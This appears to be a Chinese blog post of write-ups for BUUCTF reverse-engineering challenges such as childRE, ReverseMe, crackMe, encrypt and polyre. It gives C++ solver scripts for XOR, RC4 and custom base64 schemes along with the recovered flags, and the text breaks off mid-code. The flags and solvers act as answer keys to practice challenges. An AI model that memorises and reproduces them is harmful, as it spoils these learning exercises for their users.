    <content type="html"><![CDATA[<h1 id="BUUCTF逆向工程第三页部分题目"><a href="#BUUCTF逆向工程第三页部分题目" class="headerlink" title="BUUCTF逆向工程第三页部分题目"></a>BUUCTF逆向工程第三页部分题目</h1><p><font color="#ff0000">没写完，但是被push了，所以发出来吧~</font></p><h2 id="2019红帽杯-childRE"><a href="#2019红帽杯-childRE" class="headerlink" title="[2019红帽杯]childRE"></a>[2019红帽杯]childRE</h2><p>很神奇的一道题，不过为啥红帽杯的题都多多少少有点阴间成分？<br>首先看到它的验证部分，这个很好逆。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5DchildRE1.png"><br>运行如下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> ans[<span class="number">99</span>] = <span class="string">&quot;1234567890-=!@#$%^&amp;amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;&#x27;ASDFGHJKL:\&quot;ZXCVBNM&lt;&gt;?zxcvbnm,./&quot;</span>;</span><br><span class="line">    <span class="type">char</span> num[<span class="number">99</span>] = <span class="string">&quot;55565653255552225565565555243466334653663544426565555525555222&quot;</span>;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">99</span>] = <span class="string">&quot;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;amp;0^3&amp;amp;1@=&amp;amp;0908!6_0*&amp;amp;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i, pos;</span><br><span class="line">    pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">32</span>; i &lt; <span class="number">125</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ans[i % <span class="number">23</span>] == str[pos] &amp;amp;&amp;amp; ans[i / <span class="number">23</span>] == num[pos])</span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; <span class="built_in">char</span>(i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        pos++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(pos &lt; <span class="number">62</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就可以得到<br><code>private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</code><br>而前文中存在UnDecorateSymbolName()函数。因此我们得到的字符串是某个函数去修饰后的样子。<br>根据<a href="https://www.cnblogs.com/Clovershrub/p/17154427.html">这篇文章</a>可以知道函数去修饰前应该是<code>?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z</code><br>继续跟踪它与输入的关系可以找到找到这个函数：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5DchildRE2.png"><br>不用怀疑，这个b绝对是二叉树。为什么呢？被恶心多了就记住了。看规则是后序遍历，手动算一下遍历顺序，写出代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> raw[<span class="number">99</span>] = <span class="string">&quot;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&quot;</span>;</span><br><span class="line">    <span class="type">char</span> ans[<span class="number">99</span>];</span><br><span class="line">    <span class="type">int</span> order[<span class="number">99</span>] = &#123;<span class="number">15</span>,<span class="number">16</span>,<span class="number">7</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">9</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">11</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans[order[i]] = raw[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; ans[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行得到<code>Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP</code><br>将其32位小写md5加密后得到flag：63b148e750fed3a33419168ac58083f5</p><h2 id="SWPU2019-ReverseMe"><a href="#SWPU2019-ReverseMe" class="headerlink" title="[SWPU2019]ReverseMe"></a>[SWPU2019]ReverseMe</h2><p>这道题代码写得很神奇，反正我没看得太懂，所以嗯逆非常滴恶心。<br>下面这一段是本题唯一可以看得懂的东西。其中v29很奇怪，会莫名其妙地变掉从而执行if。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BSWPU2019%5DReverseMe1.png"><br>接着是sub_6525C0()函数中加密的部分。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BSWPU2019%5DReverseMe2.png"><br>然后是主函数中的对比部分。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BSWPU2019%5DReverseMe3.png"><br>它的代码写得非常莫名其妙，所以采用动调回事一种很好的方法。动调的时候一定要对着汇编码，随便输入点啥，然后把跟Str异或之后的东西前几位记一下。接着就不停地找哪个寄存器是这一串东西，它的值什么时候变了，就能找到加密的地方。写出代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">20</span>] = <span class="string">&quot;SWPU_2019_CTF&quot;</span>;</span><br><span class="line">    <span class="type">int</span> Xor[<span class="number">99</span>] = &#123;<span class="number">134</span>,  <span class="number">12</span>,  <span class="number">62</span>, <span class="number">202</span>, <span class="number">152</span>, <span class="number">215</span>, <span class="number">174</span>,  <span class="number">25</span>, <span class="number">226</span>, <span class="number">119</span>, </span><br><span class="line">  <span class="number">107</span>, <span class="number">166</span>, <span class="number">106</span>, <span class="number">161</span>, <span class="number">119</span>, <span class="number">176</span>, <span class="number">105</span>, <span class="number">145</span>,  <span class="number">55</span>,   <span class="number">5</span>, </span><br><span class="line">  <span class="number">122</span>, <span class="number">249</span>, <span class="number">123</span>,  <span class="number">48</span>,  <span class="number">67</span>,  <span class="number">90</span>,  <span class="number">75</span>,  <span class="number">16</span>, <span class="number">134</span>, <span class="number">125</span>, </span><br><span class="line">  <span class="number">212</span>,  <span class="number">40</span>, <span class="number">171</span>, <span class="number">171</span>, <span class="number">171</span>, <span class="number">171</span>, <span class="number">171</span>, <span class="number">171</span>, <span class="number">171</span>, <span class="number">171</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">20</span>, <span class="number">246</span>, </span><br><span class="line">  <span class="number">245</span>,  <span class="number">17</span>,  <span class="number">13</span>, <span class="number">244</span>,   <span class="number">0</span>,  <span class="number">24</span>&#125;;</span><br><span class="line">    <span class="type">int</span> input[<span class="number">99</span>] = &#123;<span class="number">179</span>,  <span class="number">55</span>,  <span class="number">15</span>, <span class="number">248</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">174</span>,  <span class="number">93</span>, <span class="number">186</span>,  <span class="number">90</span>, </span><br><span class="line">   <span class="number">77</span>, <span class="number">134</span>,  <span class="number">68</span>, <span class="number">151</span>,  <span class="number">98</span>, <span class="number">211</span>,  <span class="number">79</span>, <span class="number">186</span>,  <span class="number">36</span>,  <span class="number">22</span>, </span><br><span class="line">   <span class="number">11</span>, <span class="number">159</span>, <span class="number">114</span>,  <span class="number">26</span>, <span class="number">101</span>, <span class="number">104</span>, <span class="number">109</span>,  <span class="number">38</span>, <span class="number">186</span>, <span class="number">107</span>, </span><br><span class="line">  <span class="number">200</span>, <span class="number">103</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= str[i % <span class="built_in">strlen</span>(str)];</span><br><span class="line">        input[i] ^= Xor[i];</span><br><span class="line">        cout &lt;&lt; <span class="built_in">char</span>(input[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：Y0uaretheB3st!#@_VirtualCC</p><h2 id="羊城杯-2020-login"><a href="#羊城杯-2020-login" class="headerlink" title="[羊城杯 2020]login"></a>[羊城杯 2020]login</h2><p>是一个简单的pyinstaller逆向，下载<a href="https://files.cnblogs.com/files/blogs/775888/pyinstxtractor.zip?t=1677575994">这个</a>，在命令行里输入<br><code>python pyinstxtractor.py attachment.exe</code><br>会得到一个文件夹，在文件夹里找到login.pyc，把它传到<a href="https://tool.lu/pyc/">这里</a>就可以了。<br>是个简单的异或和z3，得到flag：58964088b637e50d3a22b9510c1d1ef8</p><h2 id="QCTF2018-Xman-babymips"><a href="#QCTF2018-Xman-babymips" class="headerlink" title="[QCTF2018]Xman-babymips"></a>[QCTF2018]Xman-babymips</h2><p>简单的异或加密，注意要取后两位，即x &amp; 0xFF。<br>得到flag：ReA11y_4_B@89_mlp5_4_XmAn_</p><h2 id="安洵杯-2019-crackMe"><a href="#安洵杯-2019-crackMe" class="headerlink" title="[安洵杯 2019]crackMe"></a>[安洵杯 2019]crackMe</h2><p>很牛逼的一道题。<br>根据findcrypt插件或者运行后搜索弹出的提示词可以找到：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5DcrackMe1.png"><br>上面一大段是对base表进行更改，下面一段看不懂。跟进得到：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5DcrackMe2.png"><br>其中sub_411172()是生成SM4加密所需轮秘钥(RK)。查看RK的交叉引用可以得到SM4的加密过程：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5DcrackMe3.png"><br>跟进TopLevelExceptionFilter可以找到校验部分：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5DcrackMe4.png"><br>在base64加密过程中有魔改的地方：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5DcrackMe5.png"><br>即：base表需要向前移动24个，同时最后的等号由叹号代替。<br>解密得到flag：SM4foRExcepioN?!<br>官方文档介绍说这个程序在main函数之前hook了MessageBoxW()函数，之后又调用了这个函数。因此在执行MessageBoxW()前先修改base表并创建VEH向量。执行函数后注册SEH并触发异常。在VEH中构造轮秘钥并注册UnhandledExceptionFilter。在SEH中进行SM4加密。在UnhandledExceptionFilter中修改对比结果并进行变种base64。最后执行比较函数。挺好的，都是中国字&#x3D;&#x3D;我看懂了。</p><h2 id="UTCTF2020-babymips"><a href="#UTCTF2020-babymips" class="headerlink" title="[UTCTF2020]babymips"></a>[UTCTF2020]babymips</h2><p>没啥技术含量。<br>得到flag：mips_cpp_gang_5VDm:~&#96;N]ze;\)5%vZ&#x3D;C’C(r#$q&#x3D;*efD”ZNY_GX&gt;6&amp;sn.wF8$v*mvA@’</p><h2 id="GKCTF-2021-QQQQT"><a href="#GKCTF-2021-QQQQT" class="headerlink" title="[GKCTF 2021]QQQQT"></a>[GKCTF 2021]QQQQT</h2><p>根据字符串找到base58加密<br>得到flag：12t4tww3r5e77</p><h2 id="NPUCTF2020-你好sao啊"><a href="#NPUCTF2020-你好sao啊" class="headerlink" title="[NPUCTF2020]你好sao啊"></a>[NPUCTF2020]你好sao啊</h2><p>这题有意思，需要对给定的数据进行base64加密，然后才可以得到结果<br>得到flag：w0w+y0U+cAn+r3lllY+dAnc3</p><h2 id="WUSTCTF2020-funnyre"><a href="#WUSTCTF2020-funnyre" class="headerlink" title="[WUSTCTF2020]funnyre"></a>[WUSTCTF2020]funnyre</h2><p>五个花指令和1000+行的屎山，没什么技术含量<br>得到flag：1dc20f6e3d497d15cef47d9a66d6f1af</p><h2 id="GUET-CTF2019-encrypt"><a href="#GUET-CTF2019-encrypt" class="headerlink" title="[GUET-CTF2019]encrypt"></a>[GUET-CTF2019]encrypt</h2><p>先魔改RC4，再魔改base64：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BGUET-CTF2019%5Dencrypt1.png"><br>魔改RC4部分的Sbox可以通过动调get_key()函数获得，sub_4007DB()函数如下：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BGUET-CTF2019%5Dencrypt2.png"><br>这个部分比较简单，逆的时候抄下来跑一边就行。而魔改base64如下：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BGUET-CTF2019%5Dencrypt3.png"><br>可以发现它采用的base表是以&#x3D;开头的，依照ascii码递增的64位字符串，即<br><code>=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|</code><br>可以写出代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> box[<span class="number">999</span>] = &#123;</span><br><span class="line">        <span class="number">176</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">112</span>, <span class="number">248</span>, <span class="number">223</span>, <span class="number">7</span>, <span class="number">60</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">80</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">22</span>, <span class="number">105</span>, <span class="number">18</span>, <span class="number">200</span>, <span class="number">43</span>, <span class="number">59</span>, <span class="number">127</span>, <span class="number">178</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">75</span>, <span class="number">104</span>, <span class="number">140</span>, <span class="number">197</span>, <span class="number">166</span>, <span class="number">21</span>, <span class="number">3</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">4</span>, <span class="number">19</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">38</span>, <span class="number">9</span>, <span class="number">237</span>, <span class="number">23</span>, <span class="number">138</span>, <span class="number">194</span>, <span class="number">242</span>, <span class="number">67</span>, <span class="number">192</span>,</span><br><span class="line">        <span class="number">172</span>, <span class="number">89</span>, <span class="number">151</span>, <span class="number">245</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">134</span>, <span class="number">213</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">218</span>, <span class="number">247</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">139</span>, <span class="number">195</span>, <span class="number">177</span>, <span class="number">119</span>, <span class="number">175</span>, <span class="number">29</span>,</span><br><span class="line">        <span class="number">48</span>, <span class="number">198</span>, <span class="number">69</span>, <span class="number">14</span>, <span class="number">95</span>, <span class="number">238</span>, <span class="number">174</span>, <span class="number">240</span>, <span class="number">40</span>, <span class="number">206</span>, <span class="number">205</span>, <span class="number">167</span>, <span class="number">155</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">72</span>, <span class="number">8</span>, <span class="number">68</span>, <span class="number">32</span>, <span class="number">254</span>, <span class="number">109</span>, <span class="number">181</span>,</span><br><span class="line">        <span class="number">46</span>, <span class="number">106</span>, <span class="number">241</span>, <span class="number">52</span>, <span class="number">188</span>, <span class="number">30</span>, <span class="number">62</span>, <span class="number">204</span>, <span class="number">65</span>, <span class="number">146</span>, <span class="number">216</span>, <span class="number">189</span>, <span class="number">165</span>, <span class="number">232</span>, <span class="number">77</span>, <span class="number">10</span>, <span class="number">73</span>, <span class="number">13</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">98</span>, <span class="number">116</span>,</span><br><span class="line">        <span class="number">212</span>, <span class="number">131</span>, <span class="number">150</span>, <span class="number">148</span>, <span class="number">61</span>, <span class="number">203</span>, <span class="number">24</span>, <span class="number">99</span>, <span class="number">153</span>, <span class="number">70</span>, <span class="number">202</span>, <span class="number">183</span>, <span class="number">142</span>, <span class="number">207</span>, <span class="number">251</span>, <span class="number">163</span>, <span class="number">108</span>, <span class="number">126</span>, <span class="number">81</span>, <span class="number">39</span>, <span class="number">96</span>,</span><br><span class="line">        <span class="number">154</span>, <span class="number">17</span>, <span class="number">243</span>, <span class="number">92</span>, <span class="number">110</span>, <span class="number">186</span>, <span class="number">66</span>, <span class="number">118</span>, <span class="number">47</span>, <span class="number">239</span>, <span class="number">191</span>, <span class="number">33</span>, <span class="number">170</span>, <span class="number">228</span>, <span class="number">214</span>, <span class="number">27</span>, <span class="number">85</span>, <span class="number">125</span>, <span class="number">190</span>, <span class="number">234</span>, <span class="number">211</span>,</span><br><span class="line">        <span class="number">16</span>, <span class="number">244</span>, <span class="number">199</span>, <span class="number">74</span>, <span class="number">35</span>, <span class="number">121</span>, <span class="number">132</span>, <span class="number">164</span>, <span class="number">28</span>, <span class="number">171</span>, <span class="number">20</span>, <span class="number">219</span>, <span class="number">76</span>, <span class="number">58</span>, <span class="number">184</span>, <span class="number">82</span>, <span class="number">236</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">182</span>, <span class="number">210</span>, <span class="number">160</span>,</span><br><span class="line">        <span class="number">90</span>, <span class="number">91</span>, <span class="number">152</span>, <span class="number">102</span>, <span class="number">84</span>, <span class="number">158</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">180</span>, <span class="number">196</span>, <span class="number">201</span>, <span class="number">208</span>, <span class="number">37</span>, <span class="number">156</span>, <span class="number">128</span>, <span class="number">222</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">34</span>, <span class="number">11</span>, <span class="number">145</span>, <span class="number">107</span>,</span><br><span class="line">        <span class="number">159</span>, <span class="number">246</span>, <span class="number">230</span>, <span class="number">226</span>, <span class="number">193</span>, <span class="number">15</span>, <span class="number">147</span>, <span class="number">144</span>, <span class="number">123</span>, <span class="number">157</span>, <span class="number">143</span>, <span class="number">221</span>, <span class="number">229</span>, <span class="number">101</span>, <span class="number">53</span>, <span class="number">173</span>, <span class="number">169</span>, <span class="number">220</span>, <span class="number">130</span>, <span class="number">187</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">83</span>, <span class="number">209</span>, <span class="number">168</span>, <span class="number">51</span>, <span class="number">233</span>, <span class="number">64</span>, <span class="number">26</span>, <span class="number">255</span>, <span class="number">161</span>, <span class="number">149</span>, <span class="number">54</span>, <span class="number">217</span>, <span class="number">235</span>, <span class="number">137</span>, <span class="number">227</span>, <span class="number">124</span>, <span class="number">115</span>, <span class="number">133</span>, <span class="number">136</span>, <span class="number">122</span>,</span><br><span class="line">        <span class="number">224</span>, <span class="number">253</span>, <span class="number">100</span>, <span class="number">12</span>, <span class="number">87</span>, <span class="number">50</span>, <span class="number">179</span>, <span class="number">185</span>, <span class="number">31</span>, <span class="number">215</span>, <span class="number">252</span>, <span class="number">129</span>, <span class="number">225</span>, <span class="number">2</span>, <span class="number">249</span>, <span class="number">93</span>, <span class="number">86</span>, <span class="number">111</span>, <span class="number">36</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ans[<span class="number">99</span>] = &#123;<span class="number">118</span>, <span class="number">53</span>, <span class="number">253</span>, <span class="number">245</span>, <span class="number">125</span>, <span class="number">71</span>, <span class="number">254</span>, <span class="number">149</span>, <span class="number">19</span>, <span class="number">122</span>, <span class="number">38</span>, <span class="number">89</span>, <span class="number">63</span>, <span class="number">255</span>, <span class="number">49</span>, <span class="number">161</span>, <span class="number">133</span>, <span class="number">124</span>, <span class="number">99</span>, <span class="number">2</span>, <span class="number">110</span>, <span class="number">189</span>, <span class="number">147</span>, <span class="number">106</span>, <span class="number">62</span>, <span class="number">77</span>, <span class="number">141</span>, <span class="number">215</span>, <span class="number">39</span>, <span class="number">115</span>, <span class="number">45</span>, <span class="number">94</span>, <span class="number">204</span>, <span class="number">98</span>, <span class="number">242</span>, <span class="number">223</span>, <span class="number">229</span>, <span class="number">210</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> v7, v8;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + <span class="number">1</span>) &amp;amp; <span class="number">0xff</span>;</span><br><span class="line">        v7 = box[j];</span><br><span class="line">        k = (k + v7) &amp;amp; <span class="number">0xff</span>;</span><br><span class="line">        v8 = box[k];</span><br><span class="line">        box[j] = v8;</span><br><span class="line">        box[k] = v7;</span><br><span class="line">        ans[i] ^= (box[(v7 + v8) &amp;amp; <span class="number">0xff</span>] &amp;amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ans[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：e10adc3949ba59abbe56e057f20f883e</p><h2 id="WMCTF2020-easy-re"><a href="#WMCTF2020-easy-re" class="headerlink" title="[WMCTF2020]easy_re"></a>[WMCTF2020]easy_re</h2><p>本题采用没听过的perl语言编写，在通过perlapp编译。此类文件会在运行前先将代码解压，然后再执行。<br>再解压前会有script关键字，同时解压后的代码会存在rax中。通过x64dbg看到：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BWMCTF2020%5Deasy_re1.png"><br>复制出来是一段perl的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">&quot;WMCTF&#123;I_WAnt_dynam1c_F1ag&#125;&quot;</span>;</span><br><span class="line">print <span class="string">&quot;please input the flag:&quot;</span>;</span><br><span class="line">$line = &lt;STDIN&gt;;</span><br><span class="line"><span class="built_in">chomp</span>($line);</span><br><span class="line"><span class="keyword">if</span>($line eq $flag)&#123;</span><br><span class="line">        print <span class="string">&quot;congratulation!&quot;</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        print <span class="string">&quot;no,wrong&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：I_WAnt_dynam1c_F1ag</p><h2 id="CISCN2018-2ex"><a href="#CISCN2018-2ex" class="headerlink" title="[CISCN2018]2ex"></a>[CISCN2018]2ex</h2><p>魔改base64，但是题目给的输出多了一个”|”，不是很理解。<br>得到flag：change53233</p><h2 id="RoarCTF2019-polyre"><a href="#RoarCTF2019-polyre" class="headerlink" title="[RoarCTF2019]polyre"></a>[RoarCTF2019]polyre</h2><p>很牛逼的一道题。打开看见ollvm混淆，夹杂了控制流平坦化和虚假控制流。采用<a href="https://www.cnblogs.com/Clovershrub/p/17110043.html#_label2">脚本</a>去除后看见：<br>P.S.官方题解给出的debcf脚本在IDA7.7中已无法运行，需要自己更新一下，或者用我的。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-3/%5BRoarCTF2019%5Dpolyre1.png"><br>可以看见它又一些莫名其妙地语句。整体算法发现是可逆的，如果数据大于0，执行后必定为偶数，否则必定为奇数。可以写出代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span 